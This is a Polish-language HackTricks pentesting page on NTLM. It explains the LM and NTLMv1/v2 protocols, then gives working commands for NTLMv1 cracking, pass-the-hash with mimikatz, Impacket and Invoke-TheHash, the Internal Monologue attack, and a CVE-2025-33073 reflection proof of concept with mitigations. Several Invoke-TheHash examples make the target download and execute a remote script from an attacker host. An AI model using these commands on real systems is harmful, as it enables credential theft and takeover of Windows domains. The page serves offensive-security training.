# NTLM

{{#include ../../banners/hacktricks-training.md}}


## Basic Information

W środowiskach, w których działają **Windows XP i Server 2003**, używane są hashe LM (Lan Manager), chociaż powszechnie wiadomo, że można je łatwo złamać. Określony hash LM, `AAD3B435B51404EEAAD3B435B51404EE`, wskazuje na scenariusz, w którym LM nie jest używany, i reprezentuje hash pustego ciągu.

Domyślnie główną metodą uwierzytelniania jest protokół **Kerberos**. NTLM (NT LAN Manager) wchodzi do gry w określonych sytuacjach: brak Active Directory, nieistnienie domeny, awaria Kerberos z powodu błędnej konfiguracji lub gdy połączenia są inicjowane przy użyciu adresu IP zamiast prawidłowej nazwy hosta.

Obecność nagłówka **"NTLMSSP"** w pakietach sieciowych sygnalizuje proces uwierzytelniania NTLM.

Obsługa protokołów uwierzytelniania - LM, NTLMv1 i NTLMv2 - jest realizowana przez określoną bibliotekę DLL znajdującą się w `%windir%\Windows\System32\msv1\_0.dll`.

**Key Points**:

- Hashe LM są podatne na ataki, a pusty hash LM (`AAD3B435B51404EEAAD3B435B51404EE`) oznacza, że nie są używane.
- Kerberos jest domyślną metodą uwierzytelniania, a NTLM jest używany tylko w określonych warunkach.
- Pakiety uwierzytelniania NTLM można rozpoznać po nagłówku "NTLMSSP".
- Protokoły LM, NTLMv1 i NTLMv2 są obsługiwane przez plik systemowy `msv1\_0.dll`.

## LM, NTLMv1 and NTLMv2

Możesz sprawdzić i skonfigurować, który protokół będzie używany:

### GUI

Uruchom _secpol.msc_ -> Local policies -> Security Options -> Network Security: LAN Manager authentication level. Są 6 poziomy (od 0 do 5).

![](<../../images/image (919).png>)

### Registry

To ustawi poziom 5:
```
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ /v lmcompatibilitylevel /t REG_DWORD /d 5 /f
```
Możliwe wartości:
```
0 - Send LM & NTLM responses
1 - Send LM & NTLM responses, use NTLMv2 session security if negotiated
2 - Send NTLM response only
3 - Send NTLMv2 response only
4 - Send NTLMv2 response only, refuse LM
5 - Send NTLMv2 response only, refuse LM & NTLM
```
## Basic NTLM Domain authentication Scheme

1. **user** wprowadza swoje **credentials**
2. Maszyna kliencka **wysyła request autentication** przesyłając **domain name** i **username**
3. **server** wysyła **challenge**
4. **client encrypts** **challenge** używając hash hasła jako key i wysyła go jako response
5. **server sends** do **Domain controller** **domain name, username, challenge i response**. Jeśli **nie ma** skonfigurowanego Active Directory albo domain name jest nazwą serwera, credentials są **checked locally**.
6. **domain controller checks if everything is correct** i wysyła informacje do serwera

**server** i **Domain Controller** mogą utworzyć **Secure Channel** przez serwer **Netlogon**, ponieważ Domain Controller zna hasło serwera (jest ono w bazie **NTDS.DIT**).

### Local NTLM authentication Scheme

Authentication jest taka sama jak opisana **wcześniej, ale** **server** zna **hash usera**, który próbuje się autentykować, znajdujący się w pliku **SAM**. Zatem zamiast pytać Domain Controller, **server sam sprawdzi**, czy user może się autentykować.

### NTLMv1 Challenge

Długość **challenge** to **8 bytes**, a **response** ma **24 bytes**.

**hash NT (16bytes)** jest podzielony na **3 części po 7bytes** każda (7B + 7B + (2B+0x00\*5)): **ostatnia część jest wypełniona zerami**. Następnie **challenge** jest **ciphered separately** z każdą częścią, a powstałe **ciphered bytes** są łączone. Razem: 8B + 8B + 8B = 24Bytes.

**Problems**:

- Brak **randomness**
- 3 części mogą być **attacked separately** w celu znalezienia NT hash
- **DES is crackable**
- 3º key jest zawsze złożony z **5 zer**.
- Dla tego samego **challenge** **response** będzie takie samo. Możesz więc podać ofierze jako **challenge** ciąg "**1122334455667788**" i atakować response, używając **precomputed rainbow tables**.

### NTLMv1 attack

Obecnie coraz rzadziej spotyka się środowiska z skonfigurowanym Unconstrained Delegation, ale to nie znaczy, że nie możesz **abuse a Print Spooler service** skonfigurowanego.

Możesz abuseować niektóre credentials/sessions, które już masz w AD, aby **ask the printer to authenticate** przeciwko **host under your control**. Następnie, używając `metasploit auxiliary/server/capture/smb` albo `responder`, możesz **set the authentication challenge to 1122334455667788**, przechwycić próbę autentykacji i jeśli została wykonana z użyciem **NTLMv1**, będziesz w stanie ją **crack it**.\
Jeśli używasz `responder`, możesz spróbować użyć flagi `--lm`, aby spróbować **downgrade** **authentication**.\
_Uwaga: w tej technice authentication musi być wykonana przy użyciu NTLMv1 (NTLMv2 nie jest prawidłowy)._

Pamiętaj, że drukarka będzie używać konta komputera podczas authentication, a konta komputerów używają **long and random passwords**, których **prawdopodobnie nie będziesz w stanie crackować** za pomocą zwykłych **dictionaries**. Jednak authentication **NTLMv1** używa **DES** ([więcej info here](#ntlmv1-challenge)), więc korzystając z usług specjalnie przeznaczonych do łamania DES będziesz w stanie to crack it (możesz użyć na przykład [https://crack.sh/](https://crack.sh) albo [https://ntlmv1.com/](https://ntlmv1.com)).

### NTLMv1 attack with hashcat

NTLMv1 can also be broken with the NTLMv1 Multi Tool [https://github.com/evilmog/ntlmv1-multi](https://github.com/evilmog/ntlmv1-multi) which formats NTLMv1 messages im a method that can be broken with hashcat.

The command
```bash
python3 ntlmv1.py --ntlmv1 hashcat::DUSTIN-5AA37877:76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595:1122334455667788
```
```md
Would output the below:
```
```bash
['hashcat', '', 'DUSTIN-5AA37877', '76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D', '727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595', '1122334455667788']

Hostname: DUSTIN-5AA37877
Username: hashcat
Challenge: 1122334455667788
LM Response: 76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D
NT Response: 727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
CT1: 727B4E35F947129E
CT2: A52B9CDEDAE86934
CT3: BB23EF89F50FC595

To Calculate final 4 characters of NTLM hash use:
./ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

To crack with hashcat create a file with the following contents:
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788

To crack with hashcat:
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1

To Crack with crack.sh use the following token
NTHASH:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
```

```bash
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788
```
Uruchom hashcat (najlepiej w trybie rozproszonym, np. za pomocą narzędzia takiego jak hashtopolis), ponieważ w przeciwnym razie zajmie to kilka dni.
```bash
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1
```
W tym przypadku wiemy, że hasło to `password`, więc oszukamy na potrzeby demo:
```bash
python ntlm-to-des.py --ntlm b4b9b02e6f09a9bd760f388b67351e2b
DESKEY1: b55d6d04e67926
DESKEY2: bcba83e6895b9d

echo b55d6d04e67926>>des.cand
echo bcba83e6895b9d>>des.cand
```
Teraz musimy użyć hashcat-utilities, aby przekonwertować złamane klucze des na części hash NTLM:
```bash
./hashcat-utils/src/deskey_to_ntlm.pl b55d6d05e7792753
b4b9b02e6f09a9 # this is part 1

./hashcat-utils/src/deskey_to_ntlm.pl bcba83e6895b9d
bd760f388b6700 # this is part 2
```
Na koniec ostatnia część:
```bash
./hashcat-utils/src/ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

586c # this is the last part
```
Połącz je razem:
```bash
NTHASH=b4b9b02e6f09a9bd760f388b6700586c
```
### NTLMv2 Challenge

**Długość challenge to 8 bajtów** i wysyłane są **2 responses**: jeden ma **24 bajty** długości, a długość **drugiego** jest **zmienna**.

**Pierwszy response** jest tworzony przez szyfrowanie za pomocą **HMAC_MD5** **stringa** złożonego z **client i domain** oraz z użyciem jako **key** hasha **MD4** z **NT hash**. Następnie **wynik** będzie użyty jako **key** do szyfrowania za pomocą **HMAC_MD5** **challenge**. Do tego zostanie dodany **client challenge o długości 8 bajtów**. Razem: 24 B.

**Drugi response** jest tworzony przy użyciu **kilku wartości** (nowy client challenge, **timestamp** aby uniknąć **replay attacks**...)

Jeśli masz **pcap**, który przechwycił udane uwierzytelnienie, możesz skorzystać z tego poradnika, aby uzyskać domain, username, challenge i response oraz spróbować creak hasło: [https://research.801labs.org/cracking-an-ntlmv2-hash/](https://www.801labs.org/research-portal/post/cracking-an-ntlmv2-hash/)

## Pass-the-Hash

**Gdy masz hash ofiary**, możesz go użyć, aby **impersonate** ją.\
Musisz użyć **narzędzia**, które **wykona** uwierzytelnianie **NTLM using** ten hash, **albo** możesz utworzyć nowy **sessionlogon** i **wstrzyknąć** ten hash do **LSASS**, tak aby przy każdym uwierzytelnianiu **NTLM** używany był właśnie **ten hash**. Ostatnia opcja to to, co robi mimikatz.

**Pamiętaj, że ataki Pass-the-Hash możesz wykonywać także używając kont komputerów.**

### **Mimikatz**

**Musi zostać uruchomiony jako administrator**
```bash
Invoke-Mimikatz -Command '"sekurlsa::pth /user:username /domain:domain.tld /ntlm:NTLMhash /run:powershell.exe"'
```
This will launch a process that will belongs to the users that have launch mimikatz but internally in LSASS the saved credentials are the ones inside the mimikatz parameters. Then, you can access to network resources as if you where that user (similar to the `runas /netonly` trick but you don't need to know the plain-text password).

### Pass-the-Hash from linux

You can obtain code execution in Windows machines using Pass-the-Hash from Linux.\
[**Access here to learn how to do it.**](https://github.com/carlospolop/hacktricks/blob/master/windows/ntlm/broken-reference/README.md)

### Impacket Windows compiled tools

You can download[ impacket binaries for Windows here](https://github.com/ropnop/impacket_static_binaries/releases/tag/0.9.21-dev-binaries).

- **psexec_windows.exe** `C:\AD\MyTools\psexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.my.domain.local`
- **wmiexec.exe** `wmiexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local`
- **atexec.exe** (W tym przypadku musisz podać komendę, `cmd.exe` i `powershell.exe` nie są poprawne do uzyskania interaktywnej powłoki)`C:\AD\MyTools\atexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local 'whoami'`
- Istnieje jeszcze kilka innych binariów Impacket...

### Invoke-TheHash

Możesz pobrać skrypty powershell stąd: [https://github.com/Kevin-Robertson/Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash)

#### Invoke-SMBExec
```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### Invoke-WMIExec
```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### Invoke-SMBClient
```bash
Invoke-SMBClient -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 [-Action Recurse] -Source \\dcorp-mgmt.my.domain.local\C$\ -verbose
```
#### Invoke-SMBEnum
```bash
Invoke-SMBEnum -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 -Target dcorp-mgmt.dollarcorp.moneycorp.local -verbose
```
#### Invoke-TheHash

Ta funkcja to **mieszanka wszystkich pozostałych**. Możesz podać **wiele hostów**, **wykluczyć** niektóre i **wybrać** **opcję**, której chcesz użyć (_SMBExec, WMIExec, SMBClient, SMBEnum_). Jeśli wybierzesz **dowolną** z opcji **SMBExec** i **WMIExec**, ale **nie** podasz parametru _**Command**_, to po prostu **sprawdzi**, czy masz **wystarczające uprawnienia**.
```
Invoke-TheHash -Type WMIExec -Target 192.168.100.0/24 -TargetExclude 192.168.100.50 -Username Administ -ty    h F6F38B793DB6A94BA04A52F1D3EE92F0
```
### [Evil-WinRM Pass the Hash](../../network-services-pentesting/5985-5986-pentesting-winrm.md#using-evil-winrm)

### Windows Credentials Editor (WCE)

**Musi być uruchomione jako administrator**

To narzędzie zrobi to samo co mimikatz (modyfikuje pamięć LSASS).
```
wce.exe -s <username>:<domain>:<hash_lm>:<hash_nt>
```
### Manual Windows remote execution with username and password


{{#ref}}
../lateral-movement/
{{#endref}}

## Wyodrębnianie poświadczeń z hosta Windows

**Więcej informacji o** [**tym, jak uzyskać poświadczenia z hosta Windows, znajdziesz na tej stronie**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/ntlm/broken-reference/README.md)**.**

## Atak Internal Monologue

Atak Internal Monologue to stealthowa technika wyodrębniania poświadczeń, która pozwala atakującemu pobrać hashe NTLM z maszyny ofiary **bez bezpośredniej interakcji z procesem LSASS**. W przeciwieństwie do Mimikatz, który odczytuje hashe bezpośrednio z pamięci i jest często blokowany przez rozwiązania bezpieczeństwa endpointów lub Credential Guard, ten atak wykorzystuje **lokalne wywołania do pakietu uwierzytelniania NTLM (MSV1_0) poprzez Security Support Provider Interface (SSPI)**. Atakujący najpierw **obniża ustawienia NTLM** (np. LMCompatibilityLevel, NTLMMinClientSec, RestrictSendingNTLMTraffic), aby upewnić się, że NetNTLMv1 jest dozwolony. Następnie podszywa się pod istniejące tokeny użytkowników uzyskane z uruchomionych procesów i lokalnie wyzwala uwierzytelnianie NTLM, aby wygenerować odpowiedzi NetNTLMv1 przy użyciu znanego challenge.

Po przechwyceniu tych odpowiedzi NetNTLMv1 atakujący może szybko odzyskać oryginalne hashe NTLM za pomocą **precomputed rainbow tables**, co umożliwia dalsze ataki Pass-the-Hash do lateral movement. Kluczowe jest to, że Atak Internal Monologue pozostaje stealthowy, ponieważ nie generuje ruchu sieciowego, nie wstrzykuje kodu ani nie wywołuje bezpośrednich zrzutów pamięci, przez co jest trudniejszy do wykrycia przez obrońców niż tradycyjne metody, takie jak Mimikatz.

Jeśli NetNTLMv1 nie jest akceptowany — z powodu wymuszonych polityk bezpieczeństwa — atakujący może nie uzyskać odpowiedzi NetNTLMv1.

Aby obsłużyć ten przypadek, narzędzie Internal Monologue zostało zaktualizowane: dynamicznie pobiera token serwera za pomocą `AcceptSecurityContext()`, aby nadal **przechwytywać odpowiedzi NetNTLMv2**, jeśli NetNTLMv1 zawiedzie. Chociaż NetNTLMv2 jest znacznie trudniejszy do złamania, nadal otwiera drogę do relay attacks lub offline brute-force w ograniczonych przypadkach.

PoC można znaleźć w **[https://github.com/eladshamir/Internal-Monologue](https://github.com/eladshamir/Internal-Monologue)**.

## NTLM Relay and Responder

**Przeczytaj bardziej szczegółowy przewodnik, jak przeprowadzać te ataki, tutaj:**


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

## Parsowanie challenge NTLM z przechwyconego ruchu sieciowego

**Możesz użyć** [**https://github.com/mlgualtieri/NTLMRawUnHide**](https://github.com/mlgualtieri/NTLMRawUnHide)

## NTLM & Kerberos *Reflection* via Serialized SPNs (CVE-2025-33073)

Windows zawiera kilka mechanizmów ograniczających, które próbują zapobiegać atakom *reflection*, w których uwierzytelnienie NTLM (lub Kerberos) pochodzące z hosta jest przekazywane z powrotem na **ten sam** host, aby uzyskać uprawnienia SYSTEM.

Microsoft przerwał większość publicznych łańcuchów dzięki MS08-068 (SMB→SMB), MS09-013 (HTTP→SMB), MS15-076 (DCOM→DCOM) i późniejszym poprawkom, jednak **CVE-2025-33073** pokazuje, że zabezpieczenia nadal można obejść, nadużywając sposobu, w jaki **klient SMB obcina Service Principal Names (SPNs)** zawierające *marshalled* (serialized) target-info.

### TL;DR błędu
1. Atakujący rejestruje **DNS A-record**, którego etykieta koduje marshalled SPN – np.
`srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA → 10.10.10.50`
2. Ofiara jest zmuszana do uwierzytelnienia się do tej nazwy hosta (PetitPotam, DFSCoerce itd.).
3. Gdy klient SMB przekazuje ciąg docelowy `cifs/srv11UWhRCAAAAA…` do `lsasrv!LsapCheckMarshalledTargetInfo`, wywołanie `CredUnmarshalTargetInfo` **usuwa** serializowany blob, pozostawiając **`cifs/srv1`**.
4. `msv1_0!SspIsTargetLocalhost` (lub odpowiednik Kerberos) uznaje teraz cel za *localhost*, ponieważ krótka część hosta pasuje do nazwy komputera (`SRV1`).
5. W konsekwencji serwer ustawia `NTLMSSP_NEGOTIATE_LOCAL_CALL` i wstrzykuje **LSASS’ SYSTEM access-token** do kontekstu (dla Kerberos tworzony jest subsession key oznaczony jako SYSTEM).
6. Relay tego uwierzytelnienia za pomocą `ntlmrelayx.py` **lub** `krbrelayx.py` daje pełne uprawnienia SYSTEM na tym samym hoście.

### Szybkie PoC
```bash
# Add malicious DNS record
dnstool.py -u 'DOMAIN\\user' -p 'pass' 10.10.10.1 \
-a add -r srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA \
-d 10.10.10.50

# Trigger authentication
PetitPotam.py -u user -p pass -d DOMAIN \
srv11UWhRCAAAAAAAAAAAAAAAAA… TARGET.DOMAIN.LOCAL

# Relay listener (NTLM)
ntlmrelayx.py -t TARGET.DOMAIN.LOCAL -smb2support

# Relay listener (Kerberos) – remove NTLM mechType first
krbrelayx.py -t TARGET.DOMAIN.LOCAL -smb2support
```
### Patch & Mitigations
* Poprawka KB dla **CVE-2025-33073** dodaje sprawdzenie w `mrxsmb.sys::SmbCeCreateSrvCall`, które blokuje każde połączenie SMB, którego cel zawiera zmarshalowane info (`CredUnmarshalTargetInfo` ≠ `STATUS_INVALID_PARAMETER`).
* Wymuś **SMB signing**, aby zapobiec reflection nawet na niezałatanych hostach.
* Monitoruj rekordy DNS przypominające `*<base64>...*` i blokuj wektory coercion (PetitPotam, DFSCoerce, AuthIP...).

### Detection ideas
* Capture sieciowe z `NTLMSSP_NEGOTIATE_LOCAL_CALL`, gdzie IP klienta ≠ IP serwera.
* Kerberos AP-REQ zawierający klucz subsession i principal klienta równy hostname.
* Windows Event 4624/4648 SYSTEM logons bezpośrednio po których z tego samego hosta następują zdalne zapisy SMB.

Dla wariantu lokalnej reflection z **March 2026**, który nadużywa **SMB arbitrary ports** i **TCP connection reuse** do uzyskania `NT AUTHORITY\SYSTEM`, zobacz:

{{#ref}}
../windows-local-privilege-escalation/local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## References
* [NTLM Reflection is Dead, Long Live NTLM Reflection!](https://www.synacktiv.com/en/publications/la-reflexion-ntlm-est-morte-vive-la-reflexion-ntlm-analyse-approfondie-de-la-cve-2025.html)
* [MSRC – CVE-2025-33073](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-33073)

{{#include ../../banners/hacktricks-training.md}}
